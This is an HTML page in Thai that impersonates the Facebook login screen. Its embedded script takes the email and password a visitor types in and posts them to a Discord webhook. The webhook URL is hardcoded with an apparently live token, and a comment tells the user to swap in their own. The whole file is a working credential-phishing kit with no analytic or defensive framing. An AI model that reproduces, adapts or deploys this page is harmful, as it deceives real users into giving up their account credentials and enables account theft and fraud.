<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 980px;
        }
        .left-section {
            flex: 1;
        }
        .left-section h1 {
            color: #1877f2;
            font-size: 56px;
            margin: 0;
        }
        .left-section p {
            font-size: 20px;
            color: #333;
        }
        .right-section {
            flex: 1;
            max-width: 400px;
            background-color: white;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
        }
        .right-section h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }
        .login-form input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            font-size: 16px;
            border: 1px solid #dddfe2;
            border-radius: 5px;
        }
        .login-form button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-form a {
            display: block;
            text-align: center;
            margin-top: 10px;
            color: #1877f2;
            text-decoration: none;
        }
        .create-account {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #42b72a;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-align: center;
            margin-top: 10px;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <h1>facebook</h1>
            <p>Facebook ช่วยคุณเชื่อมต่อและแชร์กับผู้คนมากมายรอบตัวคุณ</p>
        </div>
        <div class="right-section">
            <div class="login-form">
                <input id="email" type="text" placeholder="อีเมลหรือเบอร์โทรศัพท์" required>
                <input id="password" type="password" placeholder="รหัสผ่าน" required>
                <button type="button" onclick="submitForm()">เข้าสู่ระบบ</button>
                <a href="#">ลืมรหัสผ่านใช่หรือไม่?</a>
                <div class="create-account">สร้างบัญชีใหม่</div>
            </div>
        </div>
    </div>
    <div class="footer">
        <p></p>
    </div>

    <script>
        function submitForm() {
            var email = document.getElementById("email").value;
            var password = document.getElementById("password").value;

            // สร้างข้อมูลที่จะส่งไปยัง Discord webhook
            var message = {
                content: "Login attempt:",
                embeds: [
                    {
                        title: "Facebook Login",
                        fields: [
                            { name: "Email", value: email },
                            { name: "Password", value: password }
                        ]
                    }
                ]
            };

            // ส่งข้อมูลไปยัง Discord webhook โดยใช้ XMLHttpRequest
            var webhookURL = "https://discord.com/api/webhooks/1252253384501887067/VEuHR4FVh43ztNVPgmE0kd7RqWFIM154Gha7s63Do-R1tc4VbuLQ8DzOaamP323Te4nd"; // แทนที่ด้วย URL ของ Discord webhook ของคุณ
            var xhr = new XMLHttpRequest();
            xhr.open("POST", webhookURL);
            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
            xhr.send(JSON.stringify(message));

            // ตรวจสอบการส่งข้อมูลสำเร็จหรือไม่
            xhr.onload = function() {
                if (xhr.status >= 200 && xhr.status < 300) {
                    alert("ส่งข้อมูลการล็อกอินไปยัง Discord Webhook สำเร็จ!");
                } else {
                    alert("เกิดข้อผิดพลาดในการส่งข้อมูลไปยัง Discord Webhook");
                }
            };
        }
    </script>
</body>
</html>
